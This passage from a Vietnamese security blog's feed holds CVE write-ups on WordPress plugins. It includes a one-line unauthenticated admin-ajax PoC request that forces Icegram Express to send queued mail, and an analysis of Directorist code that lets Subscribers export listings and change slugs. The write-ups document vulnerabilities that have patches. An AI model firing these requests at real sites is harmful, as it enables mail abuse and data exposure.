send immediately&amp;#34;]&#xA;L --&amp;gt; N[&amp;#34;Force queued emails to be sent&amp;#34;]&#xA;M --&amp;gt; O[&amp;#34;Bypass schedule &amp;amp; update campaign states&amp;#34;]&#xA;N --&amp;gt; O&#xA;O --&amp;gt; P[&amp;#34;Broken Access Control / Abuse / DoS-like behavior&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;G∆∞i request v·ªõi Unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=ig_es_trigger_mailing_queue_sending&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-12349 xu·∫•t ph√°t t·ª´ vi·ªác plugin Icegram Express ƒëƒÉng k√Ω AJAX endpoint v·ªõi &lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; nh∆∞ng kh√¥ng th·ª±c hi·ªán b·∫•t k·ª≥ ki·ªÉm tra quy·ªÅn hay x√°c th·ª±c nonce n√†o trong h√†m &lt;code&gt;trigger_mailing_queue_sending&lt;/code&gt;. ƒêi·ªÅu n√†y cho ph√©p ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p k√≠ch ho·∫°t tr·ª±c ti·∫øp cron n·ªôi b·ªô c·ªßa plugin, d·∫´n ƒë·∫øn vi·ªác √©p g·ª≠i email, b·ªè qua l·ªãch g·ª≠i, c·∫≠p nh·∫≠t tr·∫°ng th√°i campaign v√† g√¢y √°p l·ª±c kh√¥ng c·∫ßn thi·∫øt l√™n h·ªá th·ªëng. B·∫£n v√° ·ªü phi√™n b·∫£n 5.9.11 ƒë√£ kh·∫Øc ph·ª•c tri·ªát ƒë·ªÉ v·∫•n ƒë·ªÅ b·∫±ng c√°ch b·ªï sung ki·ªÉm tra capability v√† x√°c th·ª±c nonce tr∆∞·ªõc khi cho ph√©p th·ª±c thi logic cron.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng bao gi·ªù g·∫Øn logic nh·∫°y c·∫£m v√†o &lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; m√† thi·∫øu ki·ªÉm tra quy·ªÅn.&lt;/li&gt;&#xA;&lt;li&gt;AJAX endpoint trong WordPress lu√¥n ph·∫£i k·∫øt h·ª£p &lt;strong&gt;capability check&lt;/strong&gt; v√† &lt;strong&gt;nonce verification&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Cron ho·∫∑c background process c√≥ t√°c ƒë·ªông h·ªá th·ªëng c·∫ßn ƒë∆∞·ª£c b·∫£o v·ªá nh∆∞ c√°c h√†nh ƒë·ªông qu·∫£n tr·ªã.&lt;/li&gt;&#xA;&lt;li&gt;Broken Access Control c√≥ th·ªÉ d·∫´n ƒë·∫øn l·∫°m d·ª•ng ch·ª©c nƒÉng ngay c·∫£ khi kh√¥ng r√≤ r·ªâ d·ªØ li·ªáu tr·ª±c ti·∫øp.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/email-subscribers/vulnerability/wordpress-email-subscribers-newsletters-plugin-5-9-10-missing-authentication-to-unauthenticated-mailing-queue-trigger-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Email Subscribers &amp;amp; Newsletters Plugin &amp;lt;= 5.9.10 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12174 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-13-cve-2025-12174/</link>
      <pubDate>Sat, 13 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-13-cve-2025-12174/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-13-cve-2025-12174/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Directorist: AI-Powered Business Directory Plugin with Classified Ads Listings&lt;/strong&gt; cho WordPress t·ªìn t·∫°i l·ªó h·ªïng truy c·∫≠p tr√°i ph√©p do thi·∫øu ki·ªÉm tra quy·ªÅn h·∫°n ƒë·ªëi v·ªõi c√°c h√†nh ƒë·ªông AJAX &lt;code&gt;directorist_prepare_listings_export_file&lt;/code&gt; v√† &lt;code&gt;directorist_type_slug_change&lt;/code&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn &lt;strong&gt;8.5.2&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c, v·ªõi quy·ªÅn &lt;strong&gt;Subscriber tr·ªü l√™n&lt;/strong&gt;, c√≥ th·ªÉ xu·∫•t d·ªØ li·ªáu danh s√°ch v√† thay ƒë·ªïi slug c·ªßa directorist.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12174&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12174&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 8.5.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 8.5.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subcriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/directorist/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Directorist Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Directorist&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;8.5.2&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;8.5.3&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω hai action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_directorist_prepare_listings_export_file&amp;#39;, [ $this, &amp;#39;handle_prepare_listings_export_file_request&amp;#39; ] );&#xA;add_action( &amp;#39;wp_ajax_directorist_type_slug_change&amp;#39;, [ $this, &amp;#39;directorist_type_slug_change&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√°c hook &lt;code&gt;wp_ajax_&lt;/code&gt; ch·ªâ d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p (t·ª´ Subscriber tr·ªü l√™n). Hai action tr√™n g·ªçi ƒë·∫øn hai h√†m x·ª≠ l√Ω t∆∞∆°ng ·ª©ng.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;1. &lt;code&gt;wp_ajax_directorist_prepare_listings_export_file&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_prepare_listings_export_file_request() {&#xA;    if ( ! directorist_verify_nonce() ) {&#xA;        $data[&amp;#39;success&amp;#39;] = false;&#xA;        $data[&amp;#39;message&amp;#39;] = __( &amp;#39;Something is wrong! Please refresh and retry.&amp;#39;, &amp;#39;directorist&amp;#39; );&#xA;&#xA;        return wp_send_json( $data );&#xA;    }&#xA;&#xA;    $file = Directorist\Listings_Exporter::get_prepared_listings_export_file();&#xA;&#xA;    wp_send_json( $file );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y tr·∫£ v·ªÅ to√†n b·ªô &lt;strong&gt;Directory Listings&lt;/strong&gt; d∆∞·ªõi d·∫°ng file &lt;code&gt;.csv&lt;/code&gt;, ƒë∆∞·ª£c t·∫°o b·ªüi h√†m &lt;code&gt;get_prepared_listings_export_file()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_prepared_listings_export_file() {&#xA;    $filename      = &amp;#34;listings-export-data&amp;#34;;&#xA;    $file_name     = &amp;#34;{$filename}.csv&amp;#34;;&#xA;    $file_contents = self::get_listings_data_as_csv_content();&#xA;&#xA;    $old_file_id = get_directorist_option( &amp;#39;directorist_export_attachent_id&amp;#39;, &amp;#39;&amp;#39;, true );&#xA;    if ( ! empty( $old_file_id ) ) {&#xA;        wp_delete_attachment( $old_file_id, true );&#xA;    }&#xA;&#xA;    $upload_dir = wp_upload_dir();&#xA;&#xA;    if ( wp_mkdir_p( $upload_dir[&amp;#39;path&amp;#39;] ) ) {&#xA;        $file = $upload_dir[&amp;#39;path&amp;#39;] . &amp;#39;/&amp;#39; . $file_name;&#xA;    } else {&#xA;        $file = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/&amp;#39; . $file_name;&#xA;    }&#xA;&#xA;    file_put_contents( $file, $file_contents );&#xA;&#xA;    $wp_filetype = wp_check_filetype( $file_name, null );&#xA;    $attachment = [&#xA;        &amp;#39;post_mime_type&amp;#39; =&amp;gt; $wp_filetype[&amp;#39;type&amp;#39;],&#xA;        &amp;#39;post_title&amp;#39;     =&amp;gt; sanitize_file_name( $filename ),&#xA;        &amp;#39;post_content&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;post_status&amp;#39;    =&amp;gt; &amp;#39;inherit&amp;#39;&#xA;    ];&#xA;&#xA;    $attach_id = wp_insert_attachment( $attachment, $file );&#xA;    $attach_url = wp_get_attachment_url( $attach_id );&#xA;&#xA;    update_directorist_option( &amp;#39;directorist_export_attachent_id&amp;#39;, $attach_id );&#xA;&#xA;    return [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;file_url&amp;#39; =&amp;gt; $attach_url ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê∆∞·ªùng d·∫´n ƒë∆∞·ª£c tr·∫£ v·ªÅ ch√≠nh l√† gi√° tr·ªã &lt;strong&gt;&lt;code&gt;file_url&lt;/code&gt;&lt;/strong&gt; trong m·∫£ng k·∫øt qu·∫£ c·ªßa h√†m:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;file_url&amp;#39; =&amp;gt; $attach_url ];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C·ª• th·ªÉ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;File CSV ƒë∆∞·ª£c t·∫°o t·∫°i th∆∞ m·ª•c upload c·ªßa WordPress, v√≠ d·ª•:&#xA;&lt;strong&gt;&lt;code&gt;wp-content/uploads/2025/01/listings-export-data.csv&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Sau ƒë√≥ file ƒë∆∞·ª£c ƒëƒÉng k√Ω d∆∞·ªõi d·∫°ng &lt;strong&gt;attachment&lt;/strong&gt;, v√† WordPress t·∫°o ra m·ªôt &lt;strong&gt;URL truy c·∫≠p c√¥ng khai&lt;/strong&gt;, ch√≠nh URL n√†y ƒë∆∞·ª£c tr·∫£ v·ªÅ trong &lt;code&gt;file_url&lt;/code&gt;, v√≠ d·ª•:&#xA;&lt;strong&gt;&lt;code&gt;https://example.com/wp-content/uploads/2025/01/listings-export-data.csv&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Danh s√°ch c√°c &lt;strong&gt;Directory Listings&lt;/strong&gt; c√≥ th·ªÉ t√¨m th·∫•y ·ªü endpoint: &lt;code&gt;http://localhost/wp-admin/edit.php?post_type=at_biz_dir&lt;/code&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-13-cve-2025-12174/listing.png&#34; title=&#34;Danh s√°ch c√°c Directory Listings&#34; data-thumbnail=&#34;/posts/2025-12-13-cve-2025-12174/listing.png&#34; data-sub-html=&#34;&lt;h2&gt;Listing&lt;/h2&gt;&lt;p&gt;Danh s√°ch c√°c Directory Listings&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-13-cve-2025-12174/listing.png&#39; alt=&#34;Listing&#34; height=&#34;919&#34; width=&#34;1841&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Danh s√°ch c√°c Directory Listings&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;2. &lt;code&gt;wp_ajax_directorist_type_slug_change&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function directorist_type_slug_change() {&#xA;    if ( ! directorist_verify_nonce() ) {&#xA;        wp_send_json(&#xA;            [&#xA;                &amp;#39;error&amp;#39; =&amp;gt; __( &amp;#39;Session expired, please reload the window and try again.&amp;#39;, &amp;#39;directorist&amp;#39; ),&#xA;            ]&#xA;        );&#xA;    }&#xA;&#xA;    $type_id     = isset( $_POST[&amp;#39;type_id&amp;#39;] ) ? sanitize_key( $_POST[&amp;#39;type_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $update_slug = isset( $_POST[&amp;#39;update_slug&amp;#39;] ) ? sanitize_key( $_POST[&amp;#39;update_slug&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;&#xA;    $directory_slugs = [];&#xA;    $listing_types   = directorist_get_directories();&#xA;&#xA;    if ( $listing_types ) {&#xA;        foreach ( $listing_types as $listing_type ) {&#xA;            $directory_slugs[] = $listing_type-&amp;gt;slug;&#xA;            if ( $type_id == $listing_type-&amp;gt;term_id ) {&#xA;                $old_slug = $listing_type-&amp;gt;slug;&#xA;            }&#xA;        }&#xA;    }&#xA;&#xA;    if ( in_array( $update_slug, $directory_slugs ) ) {&#xA;        wp_send_json(&#xA;            [&#xA;                &amp;#39;error&amp;#39;    =&amp;gt; __( &amp;#39;This slug already in use.&amp;#39;, &amp;#39;directorist&amp;#39; ),&#xA;                &amp;#39;old_slug&amp;#39; =&amp;gt; ! empty( $old_slug ) ? $old_slug : &amp;#39;&amp;#39;,&#xA;            ]&#xA;        );&#xA;    } else {&#xA;        $update_type_slug = wp_update_term( $type_id, ATBDP_TYPE, [ &amp;#39;slug&amp;#39; =&amp;gt; $update_slug ] );&#xA;        if ( $update_type_slug ) {&#xA;            wp_send_json(&#xA;                [&#xA;                    &amp;#39;success&amp;#39; =&amp;gt; __( &amp;#39;Slug changes successfully.&amp;#39;, &amp;#39;directorist&amp;#39; ),&#xA;                ]&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y cho ph√©p thay ƒë·ªïi slug c·ªßa b·∫•t k·ª≥ Listing Type n√†o v·ªõi &lt;code&gt;type_id&lt;/code&gt; v√† &lt;code&gt;update_slug&lt;/code&gt; ƒë∆∞·ª£c l·∫•y t·ª´ POST request.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;ƒê·ªÉ √Ω 1 t√≠, ta th·∫•y c·∫£ 2 callback ƒë·ªÅu g·ªçi ƒë·∫øn &lt;code&gt;directorist_verify_nonce&lt;/code&gt; ƒë·ªÉ tri·ªÉn khai c∆° ch·∫ø ch·ªëng CSRF v·ªõi action m·∫∑c ƒë·ªãnh l√† &lt;code&gt;directorist_nonce&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function directorist_verify_nonce( $nonce_field = &amp;#39;directorist_nonce&amp;#39;, $action = &amp;#39;&amp;#39; ) {&#xA;    $nonce = ! empty( $_REQUEST[ $nonce_field ] ) ? directorist_clean( wp_unslash( $_REQUEST[ $nonce_field ] ) ) : &amp;#39;&amp;#39;;&#xA;    return wp_verify_nonce( $nonce, ( $action ? $action : directorist_get_nonce_key() ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;nonce &lt;code&gt;directorist_nonce&lt;/code&gt; lu√¥n t·ªìn t·∫°i cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;L·ªó h·ªïng ph√°t sinh do kh√¥ng th·ª±c hi·ªán b·∫•t k·ª≥ ki·ªÉm tra quy·ªÅn (capability/permission) n√†o.&lt;/strong&gt; Ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p (t·ª´ Subscriber tr·ªü l√™n) c√≥ th·ªÉ 